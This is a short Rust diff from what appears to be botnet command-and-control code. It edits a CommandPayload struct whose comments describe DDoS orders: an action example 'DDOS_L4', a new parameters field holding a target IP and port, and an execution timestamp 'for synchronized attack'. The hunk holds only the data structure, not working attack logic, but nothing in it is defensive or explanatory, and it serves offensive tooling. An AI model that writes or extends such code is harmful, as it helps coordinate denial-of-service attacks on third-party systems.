@@ -59,7 +59,8 @@ pub struct GhostPacket {
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct CommandPayload {
     pub id: String,         // UUIDv4
-    pub action: String,     // e.g. "ddos:target.com"
+    pub action: String,     // e.g. "DDOS_L4"
+    pub parameters: String, // e.g. "1.1.1.1|80|... "
     pub execute_at: i64,    // Unix Timestamp for synchronized attack
 }
 
